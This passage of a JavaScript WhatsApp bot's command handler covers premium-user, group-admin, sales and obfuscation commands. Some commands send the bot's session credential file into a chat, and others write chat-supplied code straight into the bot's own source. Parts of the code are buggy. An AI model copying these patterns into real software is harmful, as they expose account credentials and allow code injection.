				await m.reply(`*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Nama Group :* *${q}*`, { detectLink: true })
				await Xlesy.groupParticipantsUpdate(group.id, [m.sender], 'promote')
				await Xlesy.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'addpr': case 'addprem': case 'addpremium': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30 hari`, { quoted: fkontak1 })
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Xlesy.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', { quoted: fkontak1 })
				if (teks2) {
					if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
						prem.addPremiumUser(nmrnya, teks2.replace(/[^0-9]/g, '') + 'd', premium);
						m.reply(`Sukses ${command} @${nmrnya.split('@')[0]} Selama ${teks2}`, { quoted: fkontak1 })
						db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.premium
						db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.premium
					} else m.reply('Nomer tidak terdaftar di BOT !', { quoted: fkontak1 })
				} else {
					m.reply(`Masukkan waktunya!\Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30d\n_d = day_`, { quoted: fkontak1 })
				}
			}
			break
			case 'delpr': case 'delprem': case 'delpremium': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply(`Example:\n${prefix + command} @tag`, { quoted: fkontak1 })
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
					if (prem.checkPremiumUser(nmrnya, premium)) {
						premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
						fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
						m.reply(`Sukses ${command} @${nmrnya.split('@')[0]}`, { quoted: fkontak1 })
						db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.free
						db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.free
					} else {
						m.reply(`User @${nmrnya.split('@')[0]} Bukan Premium❗`, { quoted: fkontak1 })
					}
				} else m.reply('Nomer tidak terdaftar di BOT !', { wuoted: fkontak1 })
			}
			break
case 'listpr': case 'listprem': case 'listpremium': {
    if (!isCreator) return m.reply(mess.owner)
    
    let txt = `*------「 LIST PREMIUM 」------*\n\n`
    
    if (premium.length === 0) {
        return m.reply("Tidak ada pengguna premium saat ini.", { quoted: fkontak1 })
    }

    for (let userprem of premium) {
        let userData = db.users[userprem.id] // Ambil data user

        if (!userData) { // Cek apakah user terdaftar di db.users
            txt += `➸ *Nomer*: @${userprem.id.split('@')[0]}\n➸ *Limit*: Data tidak ditemukan\n➸ *Uang*: Data tidak ditemukan\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
        } else {
            txt += `➸ *Nomer*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${userData.limit || 0}\n➸ *Uang*: ${userData.uang ? userData.uang.toLocaleString('id-ID') : 0}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
        }
    }
    
    m.reply(txt, { quoted: fkontak1 })
}
break
			case 'upsw': {
				if (!isCreator) return m.reply(mess.owner)
				const statusJidList = Object.keys(db.users)
				const backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
				try {
					if (quoted.isMedia) {
						if (/image|video/.test(quoted.mime)) {
							await Xlesy.sendMessage('status@broadcast', {
								[`${quoted.mime.split('/')[0]}`]: await quoted.download(),
								caption: text || m.quoted?.body || ''
							}, { statusJidList, broadcast: true })
							Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
						} else if (/audio/.test(quoted.mime)) {
							await Xlesy.sendMessage('status@broadcast', {
								audio: await quoted.download(),
								mimetype: 'audio/mp4',
								ptt: true
							}, { backgroundColor, statusJidList, broadcast: true })
							Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
						} else m.reply('Only Support video/audio/image/text')
					} else if (quoted.text) {
						await Xlesy.sendMessage('status@broadcast', { text: text || m.quoted?.body || '' }, {
							textArgb: 0xffffffff,
							font: Math.floor(Math.random() * 9),
							backgroundColor, statusJidList,
							broadcast: true
						})
						Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
					} else m.reply('Only Support video/audio/image/text')
				} catch (e) {
					m.reply('Gagal Mengupload Status Whatsapp!')
				}
			}
			break
			case 'addcase': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text && !text.startsWith('case')) return m.reply('Masukkan Casenya!')
				fs.readFile('Xlesy.js', 'utf8', (err, data) => {
					if (err) {
						console.error('Terjadi kesalahan saat membaca file:', err);
						return;
			        }					
					if (posisi !== -1) {
						const codeBaru = data.slice(0, posisi) + '\n' + `${text}` + '\n' + data.slice(posisi);
						fs.writeFile('Xlesy.js', codeBaru, 'utf8', (err) => {
							if (err) {
								m.reply('Terjadi kesalahan saat menulis file: ', err);
							} else {
								m.reply('Case berhasil ditambahkan');
							}
						});
					} else {
						m.reply('Gagal Menambahkan case!');
					}
				});
			}
			break
			case 'getcase': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Masukkan Nama Casenya!')
				try {
					const getCase = (cases) => {
						return "case"+`'${cases}'`+fs.readFileSync("Xlesy.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
					}
					m.reply(`${getCase(text)}`, { quoted: fkontak1 })
				} catch (e) {
					m.reply(`case ${text} tidak ditemukan!`, { quoted: fkontak1 })
				}
			}
			break
			case 'delcase': {
				if (!isCreator) return m.reply(mess.owner)
				if (!text) return m.reply('Masukkan Nama Casenya!')
				fs.readFile('Xlesy.js', 'utf8', (err, data) => {
					if (err) {
						console.error('Terjadi kesalahan saat membaca file:', err);
						return;
					}
					const regex = new RegExp(`case\\s+'${text.toLowerCase()}':[\\s\\S]*?break`, 'g');
					const modifiedData = data.replace(regex, '');
					fs.writeFile('Xlesy.js', modifiedData, 'utf8', (err) => {
						if (err) {
							m.reply('Terjadi kesalahan saat menulis file: ', err);
						} else {
							m.reply('Case berhasil dihapus dari file');
						}
					});
				});
			}
			break
			case 'getsession': {
				if (!isCreator) return m.reply(mess.owner)
				await m.reply({
					document: fs.readFileSync('./SessionXlesy/creds.json'),
					mimetype: 'application/json',
					fileName: 'creds.json'
				},
				{ quoted: fkontak1 })
			}
			break
			case 'deletesession': case 'delsession': {
				if (!isCreator) return m.reply(mess.owner)
				fs.readdir('./SessionXlesy', async function (err, files) {
					if (err) {
						console.error('Unable to scan directory: ' + err,
						{ quoted: fkontak1 })
						return m.reply('Unable to scan directory: ' + err,
			{ quoted: fkontak1 })
					}
					let filteredArray = await files.filter(item => ['session-', 'pre-key', 'sender-key', 'app-state'].some(ext => item.startsWith(ext)));					
					let teks = `Terdeteksi ${filteredArray.length} Session file\n\n`
					if(filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function(e, i) {
						teks += (i+1)+`. ${e}\n`
					})
					if (text && text == 'true') {
						let { key } = await m.reply('Menghapus Session File..')
						await filteredArray.forEach(function (file) {
							fs.unlinkSync('./Xlesy/' + file)
						});
						sleep(2000)
						m.reply('Berhasil Menghapus Semua Sampah Session', { edit: key },
						{ quoted: fkontak1 })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`,
					{ quoted: fkontak1 })
				});
			}
			break
			case 'deletesampah': case 'delsampah': {
				if (!isCreator) return m.reply(mess.owner)
				fs.readdir('./database/sampah', async function (err, files) {
					if (err) {
						console.error('Unable to scan directory: ' + err);
						return m.reply('Unable to scan directory: ' + err);
					}
					let filteredArray = await files.filter(item => ['gif', 'png', 'bin','mp3', 'mp4', 'jpg', 'webp', 'webm', 'opus', 'jpeg'].some(ext => item.endsWith(ext)));
					let teks = `Terdeteksi ${filteredArray.length} Sampah file\n\n`
					if(filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function(e, i) {
						teks += (i+1)+`. ${e}\n`
					})
					if (text && text == 'true') {
						let { key } = await m.reply('Menghapus Sampah File..')
						await filteredArray.forEach(function (file) {
							fs.unlinkSync('./database/sampah/' + file)
						});
						sleep(2000)
						m.reply('Berhasil Menghapus Semua Sampah', { edit: key })
					} else m.reply(teks + `\nKetik _${prefix + command} true_\nUntuk Menghapus`, { quoted: fkontak1 })
				});
			}
			break
// Pastikan 'fs' diimpor di bagian paling atas
case 'sc': case 'script': {
    if (!m.text.startsWith(prefix)) return; // Pastikan hanya bisa dijalankan dengan prefix
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }, { quoted: fkontak1 });
    let audioPath = './lib/media/audio/menu.opus'
const tut = `${ucapanWaktu} kak @${m.sender.split('@')[0]}
*─────────────────────────*
> Script XlesyVIP
> Di buat Oleh: Gxyenn 
> Link script Enc https://github.com/Gxyenn/XlesyVIPenc
> Jika Ingin Down/Gitclone, Bisa Tekan Link di atas
> Please Follow My Github Thanks 
*─────────────────────────
_\`© XlesyVIP\`_

 
Apabila Anda tertarik untuk mendapatkan script bot yang no ENCr, Anda dapat membelinya langsung dari Owner saya!

*🛍️Price:* \`Rp.30.000\` Benefit:
*─────────────────────────*
- No Enc 90% ( _index.js has been enc_ )
- Supp Button ( _Not for wa business_ )
- Supp Termux, Panel, Vps, Replit, Dll
- No Backdoor! ( _Use Safe Panel!_ )
- Free Update Script 1x
- Total Menu 18
- Total Fitur 500+
- Fitur Fav ( _Brat, Bratvid, Qc, Hd, Ttdl_ )
- Cpanel 3 Server
- System Limit
- User Banned
- User Premium
- Youtube Search
- Pinterest Search
- Play Music Yt
- Sticker
- Sticker Qc
- Sticker Attp
- Sticker Brat
- Sticker Anime Brat
- Sticker Furry Brat
- Bisa Jaga Group
- AntiLink
- AntiDelete
- AntiVirtex
- Downloader Tiktok
- Downloader YouTube
- Downloader Instagram
- Downloader Videy
- Downloader Mediafire
- Upload Image To Url
- Dan Masih Banyak Lainnya!
*─────────────────────────*

🗣️ : Kok *Mahal* Bang?
👤 : Fitur Lengkap Gk *Pasaran* ^‿^

*─────────────────────────*

Owner saya juga membuka jasa sewa bot
mungkin Anda tertarik untuk mencobanya?
ketik .sewa Untuk Melihat List Nya!

_©Gxyenn_`;

   await Xlesy.relayMessage(m.chat, {
        requestPaymentMessage: {
            currencyCodeIso4217: 'IDR',
            amount1000: 30000000,
            requestFrom: m.sender,
            noteMessage: {
                extendedTextMessage: {
                    text: tut,
                    contextInfo: {
                    mentionedJid: [`${m.sender.split('@')[0]}@s.whatsapp.net`],
                        externalAdReply: {
                            showAdAttribution: true,
                        }
                    }
                }
            }
        }
    }, { quoted: ftroli });

    await Xlesy.sendMessage(m.chat, { 
    audio: { url: audioPath }, 
    mimetype: 'audio/mp4',
    ptt: false
}, { quoted: fkontak1 });
        await Xlesy.sendMessage(m.chat, { react: { text: '🛍️', key: m.key } });        
}
break
			
			// Group Menu/
			case 'add': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`, { quoted: fkontak1 })
							
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) => {
							for (let i of res) {
								let invv = await Xlesy.groupInviteCode(m.chat)
								if (i.status == 401) return m.reply('Dia Memblokir Bot!')
								if (i.status == 409) return m.reply('Dia Sudah Join!')
								if (i.status == 500) return m.reply('Grub Penuh!')
								if (i.status == 408) {
									await m.reply(`@${numbersOnly.split('@')[0]} Baru-Baru Saja Keluar Dari Grub Ini!\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`, { quoted: fkontak1 })
									await m.reply(`${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, { detectLink: true, chat: numbersOnly, quoted: fkontak }).catch((err) => m.reply('Gagal Mengirim Undangan!'))
								} else if (i.status == 403) {
									let a = i.content.content[0].attrs
									await Xlesy.sendGroupInvite(m.chat, numbersOnly, a.code, a.expiration, m.metadata.subject, `Admin: @${m.sender.split('@')[0]}\nMengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, null, { mentions: [m.sender] })
									await m.reply(`@${numbersOnly.split('@')[0]} Tidak Dapat Ditambahkan\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`, { quoted: fkontak1 })
								} else if (![200, 401, 409, 500].includes(i.status)) {
									m.reply('Gagal Add User\nStatus : ' + i.status)
								}
							}
						})
					} catch (e) {
						m.reply('Terjadi Kesalahan! Gagal Add User', { quoted: fkontak1 })
					}
				}
			}
			break
			case 'kick': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`,
					{ quoted: fkontak1 })
					} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => m.reply('Gagal Kick User!', { quoted: fkontak1}))
		        }
		}			
			break
			case 'promote': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`,
					{ quoted: fkontak1 })
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => m.reply('Gagal!'))
				}
			}
			break
			case 'demote': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} 62xxx`, { quoted: fkontak1 })
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => m.reply('Gagal!', { quoted: fkontak1}))
				}
			}
			break
			case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
			    if (!isCreator) return m.reply(mess.owner)
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} textnya`, { quoted: fkontak1 })
				} else {
					const teksnya = text ? text : m.quoted.text
					await Xlesy.groupUpdateSubject(m.chat, teksnya).catch((err) => m.reply('Gagal!', { quoted: fkontak1}))
				}
			}
			break
			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!text && !m.quoted) {
					m.reply(`Contoh: ${prefix + command} textnya`, { quoted: fkontak1 })
				} else {
					const teksnya = text ? text : m.quoted.text
					await Xlesy.groupUpdateDescription(m.chat, teksnya).catch((err) => m.reply('Gagal!', { quoted: fkontak1}))
				}
			}
			break
			case 'setppgroups': case 'setppgrup': case 'setppgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!m.quoted) return m.reply('Reply Gambar yang mau dipasang di Profile Bot', { quoted: fkontak1 })
				if (!/image/.test(quoted.type)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`, { quoted: fkontak1 })
				let media = await Xlesy.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await Xlesy.query({
						tag: 'iq',
						attrs: {
							target: m.chat,
							to: '@s.whatsapp.net',
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					m.reply('Sukses', { quoted: fkontak1 })
				} else {
					await Xlesy.updateProfilePicture(m.chat, { url: media })
					await fs.unlinkSync(media)
					m.reply('Sukses', { quoted: fkontak1 })
				}
			}
			break
			case 'delete': case 'del': case 'd': {
				if (!m.quoted) return m.reply('Reply pesan yang mau di delete',
				{ quoted: fkontak1 })
				await Xlesy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
			}
			break
			case 'pin': case 'unpin': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await Xlesy.sendMessage(m.chat, { pin: { type: command == 'pin' ? 1 : 0, time: 2592000, key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let response = await Xlesy.groupInviteCode(m.chat)
				await m.reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${(store.groupMetadata[m.chat] || await Xlesy.groupMetadata(m.chat)).subject}`, { detectLink: true }, { quoted: fkontak1 })
			}
			break
			case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await Xlesy.groupRevokeInvite(m.chat).then((a) => {
					m.reply(`Sukses Menyetel Ulang, Tautan Undangan Grup ${m.metadata.subject}`, { quoted: fkontak1 })
				}).catch((err) => m.reply('Gagal!'))
			}
			break
			case 'group': case 'grup': case 'gc': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let teks = text.split(' ')
				let set = db.groups[m.chat]
				switch (teks[0].toLowerCase()) {
					case 'close': case 'open':
					await Xlesy.groupSettingUpdate(m.chat, teks[0] == 'close' ? 'announcement' : 'not_announcement').then(a => m.reply(`*Sukses ${teks[0] == 'open' ? 'Membuka' : 'Menutup'} Group*`, { quoted: fkontak1}))
					break
					case 'join':
					const _list = await Xlesy.groupRequestParticipantsList(m.chat).then(a => a.map(b => b.jid))
					if (/(a(p|pp|cc)|(ept|rove))|true|ok/i.test(teks[1])) {
						await Xlesy.groupRequestParticipantsUpdate(m.chat, _list, 'approve').catch(e => m.reply({ react: { text: '❌', key: m.key }}))
					} else if (/reject|false|no/i.test(teks[1])) {
						await Xlesy.groupRequestParticipantsUpdate(m.chat, _list, 'reject').catch(e => m.reply({ react: { text: '❌', key: m.key }}))
					} else {
						m.reply(`List Request Join :\n${_list.length > 0 ? '- @' + _list.join('\n- @').split('@')[0] : '*Nothing*'}\nExample : ${prefix + command} approve/reject`, { quoted: fkontak1 })
					}
					break
					case 'pesansementara': case 'disappearing':
					if (/90|7|1|24|on/i.test(teks[1])) {
						Xlesy.sendMessage(m.chat, { disappearingMessagesInChat: /90/i.test(teks[1]) ? 7776000 : /7/i.test(teks[1]) ? 604800 : 86400 })
					} else if (/0|off|false/i.test(teks[1])) {
						Xlesy.sendMessage(m.chat, { disappearingMessagesInChat: 0 })
					} else m.reply('Silahkan Pilih :\n90 hari, 7 hari, 1 hari, off', 
					{ quoted: fkontak1 })
					break
					case 'antilink': case 'antivirtex': case 'antidelete': case 'welcome': case 'mute': case 'antitoxic': case 'waktusholat': case 'nsfw':
					if (/on|true/i.test(teks[1])) {
						if (set[teks[0]]) return m.reply('*Sudah Aktif Sebelumnya*',
						{ quoted: fkontak1 })
						set[teks[0]] = true
						m.reply('*Sukse Change To On*',
						{ quoted: fkontak1 })
					} else if (/off|false/i.test(teks[1])) {
						set[teks[0]] = false
						m.reply('*Sukse Change To Off*',
						{ quoted: fkontak1 })											} else {
						m.reply(`❗${teks[0].charAt(0).toUpperCase() + teks[0].slice(1)} on/off`,
						{ quoted: fkontak1 })
					}
					break
					default:
					m.reply(`${m.metadata.subject}\n- Mute : ${set.mute ? '✅' : '❌'}\n- Anti Link : ${set.antilink ? '✅' : '❌'}\n- Anti Virtex : ${set.antivirtex ? '✅' : '❌'}\n- Anti Delete : ${set.antidelete ? '✅' : '❌'}\n- Welcome : ${set.welcome ? '✅' : '❌'}\n- Pesan Sementara: on/off\n- Join acc/reject\n\nExample:\n${prefix + command} antilink off`,
					{ quoted: fkontak1 })
				}
			}
			break
			case 'tagall': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				let setv = pickRandom(listv)
				let teks = `*Tag All*\n\n*Pesan :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await m.reply(teks, { mentions: m.metadata.participants.map(a => a.id) },
				{ quoted: fkontak1 })
			}
			break
			case 'hidetag': case 'h': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				await m.reply(q ? q : '', { mentions: m.metadata.participants.map(a => a.id) },
				{ quoted: fkontak1 })
			}
			break
			case 'totag': {
				if (!m.isGroup) return m.reply(mess.group)
				if (!m.isAdmin) return m.reply(mess.admin)
				if (!m.isBotAdmin) return m.reply(mess.botAdmin)
				if (!m.quoted) return m.reply(`Reply pesan dengan caption ${prefix + command}`, { quoted: fkontak1 })
				delete m.quoted.chat
				await Xlesy.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
			}
			break
			case 'listonline': case 'liston': {
				if (!m.isGroup) return m.reply(mess.group)
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				if (!store.presences || !store.presences[id]) return m.reply('Sedang Tidak ada yang online!',
				{ quoted: fkontak1 })
				let online = [...Object.keys(store.presences[id]), botNumber]
				await m.reply('List Online:\n\n' + online.map(v => setv + ' @' + v.replace(/@.+/, '')).join`\n`, { mentions: online }).catch((e) => m.reply('Sedang Tidak Ada Yang Online..',
				{ quoted: fkontak1 })
				)			
			}
			break
			
			// Bot Menu
			case 'jasajadibot': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }, { quoted: fkontak1 });
    let imagePath = './lib/media/image/GxyennJasaBot.jpg'
		const uploadFile = { upload: Xlesy.waUploadToServer };
  var imageMessage = await prepareWAMessageMedia(
    {
      image: { url: imagePath },
    },
    uploadFile,
  );
  const product = {
    productImage: imageMessage.imageMessage,
    productId: "8118443944856567",
    title: "✦ 𝗝𝗮𝘀𝗮 𝗝𝗮𝗱𝗶 𝗕𝗼𝘁 ✦",
    description: "©Gxyenn",
    currencyCode: "IDR",
    priceAmount1000: "10000",
    productImageCount: 1,
  };
  const productData = {
    product: product,
    businessOwnerJid: `6283877636168@s.whatsapp.net`,
  };
  const productMessage = { productMessage: productData };
  var response = await generateWAMessageFromContent(
    m.chat,
    proto.Message.fromObject(productMessage),
    m.quoted && m.quoted.fromMe
      ? { contextInfo: { ...m.msg.contextInfo } }
      : {},
  );
  await Xlesy.relayMessage(m.chat, response.message, {
    messageId: response.key.id,
  });
  }
break
			case 'sewalist': case 'sewa': case 'sewabot': case 'sewa bot': {
Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
  const packages = [
    {
      title: `✅ *\`Paket Standard\`*`,
      description: "Price: Rp.8.000/group\nPerpanjang: Rp.3.000\nFree 1 User Premium 3d\nMasa aktif 7 hari",
      buttonText: "Buy Paket Standard",
      buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Standar_"
    },
    {
      title: `✅ *\`Paket Reguler\`*`,
      description: "Price: Rp.15.000/group\nPerpanjang: Rp.5.000\nCustom 1 Command\nFree 3 User Premium 5d\nMasa aktif 30 hari",
      buttonText: "Buy Paket Reguler",
      buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Reguler_"
    },
    {
      title: `✅ *\`Paket Luxury\`*`,
      description: "Price: Rp.27.000/group\nPerpanjang: Rp.7.000\nCustom 3 Command\nFree 5 User Premium 30d\nMasa aktif 3 bulan",
      buttonText: "Buy Paket Luxury",
      buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Luxury_"
    },
    {
      title: `✅ *\`Paket Supreme\`*`,
      description: "Price: Rp.32.000/group\nPerpanjang: Rp.10.000\nCustom 5 Command\nFree 7 User Premium 3 Bulan\nMasa aktif 5 bulan",
      buttonText: "Buy Paket Supreme",
      buttonUrl: "https://wa.me/6285810287828?text=%60Assalamualaikum+Wr+Wb%60%0A_Saya+Ingin+Sewa+Bot+Yang+Paket+Premium+Bang_"
    },
    {
      title: `✅ *\`Paket Visionary\`*`,
      description: `Price: Rp.50.000/group\nPerpanjang: Rp.13.000\nCustom 7 Command\nFree 10 User Premium 5 Bulan\nMasa aktif 1 Tahun`,
      buttonText: "Buy Paket Visionary",
      buttonUrl: "https://wa.me/6283877636168?text=_Hallo+Min=Saya+Mau+Sewa+Paket+Visionary_"
    }
  ];

  const createImage = async (path) => {
    const { imageMessage } = await generateWAMessageContent({
      image: { url: path }
    }, { upload: Xlesy.waUploadToServer });
    return imageMessage;
  };

  const imagePath = './lib/media/image/Gxyenn.png'; // Path lokal ke gambar
  const cards = [];
  for (const item of packages) {
    const imageMessage = await createImage(imagePath);
    cards.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: item.description
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `Sistem perpanjangan hanya berlaku jika sisa waktu sewa tinggal 1 hari. Jika sudah habis, perpanjangan tidak bisa dilakukan, kecuali untuk Paket Supreme Dan Paket Visionary.`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: item.title,
        hasMediaAttachment: true,
        imageMessage
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"${item.buttonText}","url":"${item.buttonUrl}"}`
          }
        ]
      })
    });
  }

  const carouselMessage = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `\n*\`ＬＩＳＴ ＳＥＷＡ ＢＯＴ\`*\n\nBerikut Adalah List *Sewa XlesyVIP*\nMurah Kann~`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© XlesyVIP"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards
          })
        })
      }
    }
  }, {});
  

  await Xlesy.relayMessage(m.chat, carouselMessage.message, { messageId: carouselMessage.key.id });
  
 await Xlesy.sendMessage(m.chat, { react: { text: '🛍️', key: m.key } });  
}
break
case 'enc': case 'encrypt': {
    if (!m.text.startsWith(prefix)) return; // Pastikan hanya bisa dijalankan dengan prefix 
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/@enc_${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/@enc_${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/@enc_${filename}`, obfuscated)
  await Xlesy.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/@enc_${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Successfully ✅"}, {quoted: fkontak1 })
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/@enc_${filename}`)
}
break
case "done": {
    if (!isOwner) return m.reply("👤 Hanya owner yang bisa menggunakan perintah ini.", { quoted: fkontak1 })
